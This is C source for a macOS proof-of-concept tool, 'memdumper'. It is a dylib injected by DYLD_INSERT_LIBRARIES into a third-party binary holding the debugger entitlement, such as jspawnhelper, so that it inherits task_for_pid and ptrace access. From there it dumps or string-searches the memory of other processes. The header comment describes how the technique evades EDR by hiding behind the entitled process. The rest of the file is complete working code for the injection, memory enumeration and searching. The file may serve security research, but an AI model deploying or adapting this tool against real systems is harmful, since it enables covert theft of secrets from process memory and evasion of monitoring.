/*
 *      _____                      .___
 *     /     \   ____   _____    __| _/_ __  _____ ______   ___________
 *    /  \ /  \_/ __ \ /     \  / __ |  |  \/     \\____ \_/ __ \_  __ \
 *   /    Y    \  ___/|  Y Y  \/ /_/ |  |  /  Y Y  \  |_> >  ___/|  | \/
 *   \____|__  /\___  >__|_|  /\____ |____/|__|_|  /   __/ \___  >__|
 *           \/     \/      \/      \/           \/|__|        \/
 *
 *        memdumper by cenobyte <vincitamorpatriae@gmail.com> 2026
 *
 * memdumper: memory dumping tool for running processes on macOS
 *
 * This code demonstrates how entitled binaries on macOS can be leveraged to
 * bypass security monitoring and EDR evasion.
 * By injecting code into a process with com.apple.security.cs.debugger
 * entitlement, you can inherit debugging privileges to dump memory of select
 * running processes.
 *
 * This DYLD library is designed to be injected into an entitled process to
 * inherit its debugging privileges and access memory of target processes.
 * It demonstrates entitlement inheritance on macOS through
 * DYLD_INSERT_LIBRARIES.
 *
 * MECHANISM:
 *
 * 1. A binary with com.apple.security.cs.debugger entitlement is executed
 *    (e.g., jspawnhelper from OpenJDK, which also has the entitlements
 *    com.apple.security.cs.allow-dyld-environment-variables and
 *    com.apple.security.cs.disable-library-validation)
 *
 * 2. DYLD_INSERT_LIBRARIES environment variable causes this library to be
 *    loaded into the entitled process's address space
 *
 * 3. This library's constructor (__attribute__((constructor))) executes
 *    with the entitled binary's entitlements inherited
 *
 * 4. With the debugger entitlement, this code can call task_for_pid() to
 *    obtain Mach task ports for target processes, enabling full memory
 *    access, thread enumeration, and process control
 *
 * CAPABILITIES:
 *
 * When successfully attached to a target process, this tool tests three methods
 * for process access and memory inspection:
 *
 * 1. task_for_pid() - Mach API that provides a task port for full memory access,
 *    thread enumeration, and the ability to read/write arbitrary process memory
 *
 * 2. ptrace() - BSD debugging API that allows attaching to a process for
 *    debugging control and memory inspection
 *
 * 3. proc_pidinfo() - Process information API that retrieves metadata such as
 *    virtual/resident memory size and thread count
 *
 * The tool can:
 * - Enumerate and dump readable memory regions
 * - Search process memory for specific strings
 * - Display process metadata and memory protection flags
 *
 * REQUIREMENTS:
 *
 * The entitled binary must have these three entitlements:
 * 1. com.apple.security.cs.debugger
 *    - Allows task_for_pid() and ptrace() on other processes
 * 2. com.apple.security.cs.allow-dyld-environment-variables
 *    - Allows DYLD_INSERT_LIBRARIES to inject this library
 * 3. com.apple.security.cs.disable-library-validation
 *    - Allows loading unsigned/third-party dylibs
 *
 * Additionally:
 * - Target process must not be protected by Hardened Runtime
 * - Target and entitled binary must run as same user (or entitled binary as root)
 *
 * LIMITATIONS:
 *
 * - Cannot access processes with Hardened Runtime enabled
 * - Cannot cross user boundaries without root privileges
 * - Cannot access SIP-protected system processes
 * - Some processes (e.g., bash) are protected by undocumented mechanisms
 *
 * EVASION CHARACTERISTICS:
 *
 * This technique demonstrates "Living Off The Land" (LOL) principles, though
 * strictly speaking, 3rd party applications like OpenJDK/jspawnhelper are not
 * traditional LOL binaries. However, such applications are commonly found on
 * macOS developer systems, making them practical candidates for this technique.
 *
 * From an EDR perspective:
 * - The entitled binary (e.g., jspawnhelper) appears as the running process
 * - The injected dylib is not independently visible as a separate process
 * - Process trees and standard monitoring show only the entitled binary
 * - However, certain macOS EDRs (e.g., CrowdStrike) log environment variables,
 *   which would reveal DYLD_INSERT_LIBRARIES and expose the technique
 *
 * USAGE:
 *
 * Set MEMDUMPER_TARGET_PID environment variable to target process ID.
 * Optional environment variables:
 * - MEMDUMPER_SEARCH: string to search for in target memory
 * - MEMDUMPER_MAX_REGIONS: maximum memory regions to dump (default: 100)
 *
 */

#include <sys/types.h>
#include <sys/sysctl.h>
#include <sys/ptrace.h>
#include <sys/wait.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>

#include <ctype.h>
#include <errno.h>
#include <libproc.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

enum {
	DEFAULT_MAX_REGIONS = 100,
	DUMP_WALK_CAP = 10000,
	SEARCH_WALK_CAP = 1000,
	SEARCH_REGION_MAX = 10 * 1024 * 1024,
	DUMP_PREVIEW = 256
};

/*
 * Copy p_comm for pid into name. Returns -1 if the process is gone
 * (sysctl succeeds with an empty kinfo_proc) or name is unusable.
 */
static int
get_process_name(pid_t pid, char *name, size_t size)
{
	struct kinfo_proc proc;
	size_t proc_size;
	int mib[4];

	if (name == NULL || size == 0)
		return (-1);

	mib[0] = CTL_KERN;
	mib[1] = KERN_PROC;
	mib[2] = KERN_PROC_PID;
	mib[3] = pid;
	proc_size = sizeof(proc);

	if (sysctl(mib, 4, &proc, &proc_size, NULL, 0) != 0)
		return (-1);
	if (proc_size < sizeof(proc))
		return (-1);
	(void)strlcpy(name, proc.kp_proc.p_comm, size);
	return (0);
}

/*
 * Print size bytes at data as hex plus ASCII, labelled with base_addr.
 */
static void
hex_dump(const unsigned char *data, size_t size, mach_vm_address_t base_addr)
{
	unsigned char c;
	size_t i, j;

	for (i = 0; i < size; i += 16) {
		fprintf(stderr, "0x%016llx: ",
		    (unsigned long long)(base_addr + i));

		/* hex */
		for (j = 0; j < 16; j++) {
			if (i + j < size)
				fprintf(stderr, "%02x ", data[i + j]);
			else
				fprintf(stderr, "   ");
			if (j == 7)
				fprintf(stderr, " ");
		}

		fprintf(stderr, " |");

		/* ASCII */
		for (j = 0; j < 16 && i + j < size; j++) {
			c = data[i + j];
			fprintf(stderr, "%c", isprint(c) ? c : '.');
		}

		fprintf(stderr, "|\n");
	}
}

/*
 * Drop a leftover object send right and move past this region.
 * A zero-length region would otherwise spin.
 */
static void
advance_region(mach_port_t object_name, mach_vm_address_t *address,
    mach_vm_size_t size)
{
	if (MACH_PORT_VALID(object_name))
		mach_port_deallocate(mach_task_self(), object_name);
	if (size == 0)
		(*address)++;
	else
		*address += size;
}

/*
 * Search readable regions for search_str. Skips a region whose read is
 * shorter than the needle so bytes_read - search_len cannot wrap.
 */
static void
search_memory(mach_port_t task, pid_t target_pid, const char *search_str)
{
	vm_region_basic_info_data_64_t info = {0};
	mach_msg_type_number_t info_count;
	mach_vm_address_t address;
	mach_vm_size_t size, bytes_read;
	unsigned char *buffer;
	mach_port_t object_name;
	size_t bytes_to_search, search_len, context_start, context_end;
	size_t context_len, i;
	int region_count, matches_found;
	kern_return_t kr;

	if (search_str == NULL || *search_str == '\0')
		return;

	fprintf(stderr, "[MEMORY SEARCH] Looking for \"%s\" in PID %d\n",
	    search_str, target_pid);

	address = 0;
	size = 0;
	region_count = 0;
	matches_found = 0;
	search_len = strlen(search_str);

	while (region_count < SEARCH_WALK_CAP) {
		info_count = VM_REGION_BASIC_INFO_COUNT_64;

		kr = mach_vm_region(task, &address, &size,
		    VM_REGION_BASIC_INFO_64, (vm_region_info_t)&info,
		    &info_count, &object_name);

		if (kr != KERN_SUCCESS)
			break;

		region_count++;

		if (!(info.protection & VM_PROT_READ)) {
			advance_region(object_name, &address, size);
			continue;
		}

		bytes_to_search = (size < (mach_vm_size_t)SEARCH_REGION_MAX) ?
		    (size_t)size : (size_t)SEARCH_REGION_MAX;
		buffer = malloc(bytes_to_search);
		if (buffer == NULL) {
			advance_region(object_name, &address, size);
			continue;
		}

		bytes_read = 0;
		kr = mach_vm_read_overwrite(task, address,
		    bytes_to_search, (mach_vm_address_t)buffer,
		    &bytes_read);

		if (kr != KERN_SUCCESS || bytes_read < search_len) {
			free(buffer);
			advance_region(object_name, &address, size);
			continue;
		}

		for (i = 0; i <= bytes_read - search_len; i++) {
			if (memcmp(buffer + i, search_str, search_len) != 0)
				continue;

			fprintf(stderr,
			    "MATCH at 0x%llx "
			    "(region: 0x%llx-0x%llx, "
			    "prot: %c%c%c)\n",
			    (unsigned long long)(address + i),
			    (unsigned long long)address,
			    (unsigned long long)(address + size),
			    (info.protection & VM_PROT_READ) ? 'r' : '-',
			    (info.protection & VM_PROT_WRITE) ? 'w' : '-',
			    (info.protection & VM_PROT_EXECUTE) ? 'x' : '-');

			context_start = (i >= 64) ? (i - 64) : 0;
			context_end = ((i + search_len + 64) < bytes_read) ?
			    (i + search_len + 64) : (size_t)bytes_read;
			context_len = context_end - context_start;

			fprintf(stderr, "Context:\n");
			hex_dump(buffer + context_start, context_len,
			    address + context_start);

			matches_found++;
		}

		free(buffer);
		advance_region(object_name, &address, size);
	}

	fprintf(stderr, "Search complete: %d matches found in %d regions\n",
	    matches_found, region_count);
}

/*
 * MEMDUMPER_MAX_REGIONS if it is a positive integer, else the default.
 */
static int
max_regions_from_env(void)
{
	const char *s;
	char *end;
	long n;

	s = getenv("MEMDUMPER_MAX_REGIONS");
	if (s == NULL || *s == '\0')
		return (DEFAULT_MAX_REGIONS);
	errno = 0;
	n = strtol(s, &end, 10);
	if (errno != 0 || end == s || *end != '\0' || n < 1 || n > DUMP_WALK_CAP)
		return (DEFAULT_MAX_REGIONS);
	return ((int)n);
}

/*
 * Hex-dump the start of each readable region, up to MEMDUMPER_MAX_REGIONS
 * displayed regions. Walks the map until it ends or DUMP_WALK_CAP.
 */
static void
dump_memory_regions(mach_port_t task, pid_t target_pid)
{
	vm_region_basic_info_data_64_t info = {0};
	mach_msg_type_number_t info_count;
	mach_vm_address_t address;
	mach_vm_size_t size, bytes_read;
	unsigned char *buffer;
	mach_port_t object_name;
	size_t bytes_to_read;
	int displayed, max_regions_to_dump, readable_regions, region_count;
	kern_return_t kr;

	fprintf(stderr, "[MEMORY DUMP] Enumerating memory regions for PID %d\n",
	    target_pid);

	address = 0;
	size = 0;
	region_count = 0;
	readable_regions = 0;
	max_regions_to_dump = max_regions_from_env();

	while (region_count < DUMP_WALK_CAP) {
		info_count = VM_REGION_BASIC_INFO_COUNT_64;

		kr = mach_vm_region(task, &address, &size,
		    VM_REGION_BASIC_INFO_64, (vm_region_info_t)&info,
		    &info_count, &object_name);

		if (kr != KERN_SUCCESS)
			break;

		region_count++;

		if (!(info.protection & VM_PROT_READ)) {
			advance_region(object_name, &address, size);
			continue;
		}

		readable_regions++;
		if (readable_regions > max_regions_to_dump) {
			advance_region(object_name, &address, size);
			continue;
		}

		fprintf(stderr,
		    "Region %d: 0x%llx - 0x%llx "
		    "(size: %llu bytes, prot: %c%c%c)\n",
		    readable_regions,
		    (unsigned long long)address,
		    (unsigned long long)(address + size),
		    (unsigned long long)size,
		    (info.protection & VM_PROT_READ) ? 'r' : '-',
		    (info.protection & VM_PROT_WRITE) ? 'w' : '-',
		    (info.protection & VM_PROT_EXECUTE) ? 'x' : '-');

		bytes_to_read = (size < (mach_vm_size_t)DUMP_PREVIEW) ?
		    (size_t)size : (size_t)DUMP_PREVIEW;
		buffer = malloc(bytes_to_read);
		if (buffer == NULL) {
			advance_region(object_name, &address, size);
			continue;
		}

		bytes_read = 0;
		kr = mach_vm_read_overwrite(task, address, bytes_to_read,
		    (mach_vm_address_t)buffer, &bytes_read);

		if (kr == KERN_SUCCESS && bytes_read > 0) {
			fprintf(stderr, "Read %llu bytes:\n",
			    (unsigned long long)bytes_read);
			hex_dump(buffer, (size_t)bytes_read, address);
		} else {
			fprintf(stderr, "Could not read memory: %s\n",
			    mach_error_string(kr));
		}

		free(buffer);
		advance_region(object_name, &address, size);
	}

	displayed = readable_regions < max_regions_to_dump ?
	    readable_regions : max_regions_to_dump;
	fprintf(stderr,
	    "Total regions found: %d (readable: %d, displayed: %d)\n",
	    region_count, readable_regions, displayed);
}

/*
 * Obtain a Mach task port and dump or search readable memory.
 * Returns 1 if task_for_pid succeeded.
 */
static int
test_task_for_pid(pid_t target_pid, const char *proc_name)
{
	struct mach_task_basic_info info = {0};
	mach_msg_type_number_t info_count, thread_count, i;
	thread_act_array_t thread_list;
	const char *search_str;
	mach_port_t task;
	kern_return_t kr;

	fprintf(stderr, "[METHOD1] task_for_pid() on PID %d (%s)\n",
	    target_pid, proc_name);

	kr = task_for_pid(mach_task_self(), target_pid, &task);
	if (kr != KERN_SUCCESS) {
		fprintf(stderr, "[!] FAILED: %s\n", mach_error_string(kr));
		return (0);
	}

	fprintf(stderr, "[*] Got task port 0x%x\n", task);

	info_count = MACH_TASK_BASIC_INFO_COUNT;
	kr = task_info(task, MACH_TASK_BASIC_INFO, (task_info_t)&info,
	    &info_count);
	if (kr == KERN_SUCCESS)
		fprintf(stderr, "[*] Task info: virt=%.1fMB res=%.1fMB\n",
		    (double)info.virtual_size / 1024.0 / 1024.0,
		    (double)info.resident_size / 1024.0 / 1024.0);

	kr = task_threads(task, &thread_list, &thread_count);
	if (kr == KERN_SUCCESS) {
		fprintf(stderr, "[*] Threads: %u\n", thread_count);
		for (i = 0; i < thread_count; i++)
			mach_port_deallocate(mach_task_self(),
			    thread_list[i]);
		vm_deallocate(mach_task_self(),
		    (vm_address_t)thread_list,
		    thread_count * sizeof(thread_act_t));
	}

	search_str = getenv("MEMDUMPER_SEARCH");
	if (search_str != NULL && *search_str != '\0')
		search_memory(task, target_pid, search_str);
	else
		dump_memory_regions(task, target_pid);

	mach_port_deallocate(mach_task_self(), task);
	return (1);
}

/*
 * Attach with PT_ATTACHEXC then detach. PT_ATTACHEXC delivers a Mach
 * exception, not a POSIX stop, so a blocking waitpid never returns.
 * Poll briefly, then detach either way. Returns 1 only if detach succeeds.
 */
static int
test_ptrace(pid_t target_pid, const char *proc_name)
{
	int i, status;

	fprintf(stderr, "[METHOD2] ptrace(PT_ATTACHEXC) on PID %d (%s)\n",
	    target_pid, proc_name);

	if (ptrace(PT_ATTACHEXC, target_pid, NULL, 0) != 0) {
		fprintf(stderr, "[!] FAILED: %s\n", strerror(errno));
		return (0);
	}

	fprintf(stderr, "[*] Attached with ptrace\n");

	for (i = 0; i < 50; i++) {
		if (waitpid(target_pid, &status, WNOHANG) > 0)
			break;
		usleep(10000);
	}

	if (ptrace(PT_DETACH, target_pid, NULL, 0) != 0) {
		fprintf(stderr, "[!] Detach failed: %s\n", strerror(errno));
		return (0);
	}

	fprintf(stderr, "[*] Detached successfully\n");
	return (1);
}

/*
 * Print virtual size, resident size, and thread count via proc_pidinfo.
 * Returns 1 if the buffer was filled.
 */
static int
test_proc_pidinfo(pid_t target_pid, const char *proc_name)
{
	struct proc_taskallinfo info;
	int size;

	fprintf(stderr, "[METHOD3] proc_pidinfo() on PID %d (%s)\n",
	    target_pid, proc_name);

	size = proc_pidinfo(target_pid, PROC_PIDTASKALLINFO, 0, &info,
	    sizeof(info));
	if (size != (int)sizeof(info)) {
		fprintf(stderr, "[!] FAILED: %s\n", strerror(errno));
		return (0);
	}

	fprintf(stderr,
	    "[*] Process info: virt=%lluMB res=%lluMB threads=%d\n",
	    (unsigned long long)(info.ptinfo.pti_virtual_size / 1024 / 1024),
	    (unsigned long long)(info.ptinfo.pti_resident_size / 1024 / 1024),
	    info.ptinfo.pti_threadnum);
	return (1);
}

/*
 * Run the three access methods against target_pid. Refuses the entitled
 * binary's own PID so ptrace(PT_ATTACHEXC) cannot attach to self.
 */
static void
test_target(pid_t target_pid)
{
	char proc_name[256];
	int success;

	if (target_pid == getpid()) {
		fprintf(stderr,
		    "[!] Refusing to target the entitled binary (PID %d)\n",
		    target_pid);
		return;
	}

	if (get_process_name(target_pid, proc_name, sizeof(proc_name)) != 0) {
		fprintf(stderr, "[!] Target PID %d not found\n", target_pid);
		return;
	}

	fprintf(stderr, "[MEMDUMPER] Target: PID %d (%s)\n",
	    target_pid, proc_name);

	success = 0;
	success += test_task_for_pid(target_pid, proc_name);
	success += test_ptrace(target_pid, proc_name);
	success += test_proc_pidinfo(target_pid, proc_name);

	fprintf(stderr, "[RESULT] %d/3 methods successful", success);
	if (success == 3)
		fprintf(stderr, " - FULL ACCESS\n");
	else if (success > 0)
		fprintf(stderr, " - PARTIAL ACCESS\n");
	else
		fprintf(stderr, " - NO ACCESS\n");
}

/*
 * Parse a positive PID from s. Returns -1 if s is missing or not a
 * whole number in range.
 */
static pid_t
pid_from_env(const char *s)
{
	char *end;
	long n;

	if (s == NULL || *s == '\0')
		return (-1);
	errno = 0;
	n = strtol(s, &end, 10);
	if (errno != 0 || end == s || *end != '\0' || n < 1 || n > INT_MAX)
		return (-1);
	return ((pid_t)n);
}

/*
 * Constructor: dump or search the target, then _exit so the entitled
 * binary's main never runs.
 */
#ifdef MEMDUMPER_NO_CTOR
__attribute__((unused))
#else
__attribute__((constructor))
#endif
static void
memdumper_init(void)
{
	const char *target_pid_str;
	char host_path[PROC_PIDPATHINFO_MAXSIZE];
	pid_t my_pid, target_pid;
	uid_t my_uid;
	int ret;

	my_pid = getpid();
	my_uid = getuid();

	fprintf(stderr, "[MEMDUMPER] Injected into PID %d (UID %u)\n",
	    my_pid, my_uid);

	ret = proc_pidpath(my_pid, host_path, sizeof(host_path));
	if (ret > 0)
		fprintf(stderr, "[MEMDUMPER] Entitled binary: %s\n", host_path);
	else
		fprintf(stderr, "[MEMDUMPER] Entitled binary: <unknown>\n");

	target_pid_str = getenv("MEMDUMPER_TARGET_PID");
	if (target_pid_str == NULL) {
		fprintf(stderr,
		    "[MEMDUMPER] No target set (use MEMDUMPER_TARGET_PID)\n");
	} else {
		target_pid = pid_from_env(target_pid_str);
		if (target_pid > 0)
			test_target(target_pid);
		else
			fprintf(stderr,
			    "[!] Invalid MEMDUMPER_TARGET_PID: %s\n",
			    target_pid_str);
	}

	fprintf(stderr, "[MEMDUMPER] Done\n\n");
#ifndef MEMDUMPER_NO_CTOR
	/*
	 * Do not return into the entitled binary's main. jspawnhelper
	 * would print its usage banner and exit non-zero.
	 */
	(void)fflush(NULL);
	_exit(0);
#endif
}
